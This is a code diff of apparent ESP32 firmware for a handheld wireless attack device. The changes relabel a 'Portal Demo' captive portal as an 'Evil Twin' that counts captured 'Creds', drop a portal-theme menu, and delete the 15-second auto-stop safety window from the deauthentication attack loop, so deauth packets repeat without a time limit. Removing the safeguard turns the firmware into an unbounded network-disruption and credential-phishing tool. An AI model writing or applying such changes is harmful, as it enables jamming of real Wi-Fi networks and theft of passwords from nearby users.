   WiFi.softAP(ssid.c_str(),nullptr,ch); delay(200);
   dnsServer.start(53,"*",IPAddress(192,168,4,1));
   etSetupWebServer();
-  Serial.printf("[PORTAL] SSID=%s ch=%d IP=192.168.4.1 theme=%s\n",
-                ssid.c_str(), ch, portalThemes[portalThemeIdx].name);
+  Serial.printf("[EVIL TWIN] SSID=%s ch=%d IP=192.168.4.1\n",ssid.c_str(),ch);
   lastEtDraw=0; currentState=STATE_ET_RUNNING;
-  triggerReaction(MOOD_WORKING, "Portal Demo", "portal up!");
+  triggerReaction(MOOD_WORKING, "Evil Twin", "portal up!");
 }
 void stopEvilTwin() {
   etActive=false; webServer.stop(); dnsServer.stop();
   WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF);
-  Serial.printf("[PORTAL] Stopped. Demo submissions: %d\n",etCredCount);
+  Serial.printf("[EVIL TWIN] Stopped. Creds: %d\n",etCredCount);
   currentState=STATE_MENU;
 }
 
@@ -1981,11 +1687,10 @@ void handleInput(char input) {
           case 4: enterDeauthTargetSelect(); return;
           case 5: startBeaconSpam(); return;
           case 6: enterEvilTwinTarget(); return;
-          case 7: currentState=STATE_PORTAL_THEME; break;
-          case 8: currentState=STATE_SUBGHZ; startSubGhz(); return;
-          case 9: currentState=STATE_NFC; break;
-          case 10: currentState=STATE_IR; break;
-          case 11: currentState=STATE_ABOUT; break;
+          case 7: currentState=STATE_SUBGHZ; startSubGhz(); return;
+          case 8: currentState=STATE_NFC; break;
+          case 9: currentState=STATE_IR; break;
+          case 10: currentState=STATE_ABOUT; break;
         }
       }
       break;
@@ -2031,16 +1736,6 @@ void handleInput(char input) {
       break;
     case STATE_ET_RUNNING:
       if(input=='q') stopEvilTwin(); break;
-    case STATE_PORTAL_THEME:
-      if(input=='w'&&portalThemeIdx>0) portalThemeIdx--;
-      else if(input=='s'&&portalThemeIdx<portalThemeCount-1) portalThemeIdx++;
-      else if(input=='e') {
-        Serial.printf("[PORTAL] theme=%s\n", portalThemes[portalThemeIdx].name);
-        triggerReaction(MOOD_SUCCESS, "Theme set", portalThemes[portalThemeIdx].name);
-        currentState=STATE_MENU;
-      }
-      else if(input=='q') currentState=STATE_MENU;
-      break;
     case STATE_SUBGHZ:
       if(input=='q') { stopSubGhz(); currentState=STATE_MENU; }
       else if(input=='e') {
@@ -2068,7 +1763,7 @@ void setup() {
   Serial.printf("[BOOT] chip=%s rev=%d cores=%d cpu=%dMHz sdk=%s\n",
                 ESP.getChipModel(), ESP.getChipRevision(), ESP.getChipCores(),
                 ESP.getCpuFreqMHz(), ESP.getSdkVersion());
-  Serial.printf("[BOOT] pins OLED/PN532 SDA=21 SCL=22 | CC1101 CS=15 SCK=18 MISO=19 MOSI=23 GDO0=4 | SD CS=5 SCK=27 MISO=16 MOSI=17 | buttons L/U/R/D=14/26/32/33\n");
+  Serial.printf("[BOOT] pins OLED/PN532 SDA=21 SCL=22 | CC1101 CS=15 GDO0=4 | SD CS=5 | buttons L/U/R/D=14/26/32/33\n");
   Serial.printf("[BOOT] debug serial=%s\n", DEBUG_SERIAL ? "on" : "off");
   esp_log_level_set("wifi", ESP_LOG_NONE);
   pinMode(PIN_CC_CS, OUTPUT);
@@ -2142,12 +1837,6 @@ void loop() {
     if (millis()-clientScanStart>=CLIENT_SCAN_MS) finishClientScan();
 
   if (currentState==STATE_DEAUTH_ATTACK && deauthAttackActive) {
-    if (millis() - deauthAttackStart >= DEAUTH_ATTACK_MS) {
-      Serial.println("[DEAUTH] auto-stop after 15s safety window");
-      stopDeauthAttack();
-      triggerReaction(MOOD_SUCCESS, "Deauth done", "15s window");
-      return;
-    }
     if (millis()-lastDeauthSend>=100) {
       const uint8_t* dest = attackClientMAC;
       if (attackTargetAll) {
@@ -2227,7 +1916,6 @@ void loop() {
       case STATE_DEAUTH_CLIENT_SCAN:   drawClientScan(); break;
       case STATE_DEAUTH_CLIENT_SELECT: drawClientSelect(); break;
       case STATE_ET_TARGET:            drawEvilTwinTarget(); break;
-      case STATE_PORTAL_THEME:         drawPortalTheme(); break;
       case STATE_SUBGHZ:  drawSubGhz(); break;
       case STATE_NFC:     drawNFC(); break;
       case STATE_IR:      drawPlaceholder("IR Remote",  "Coming soon..."); break;
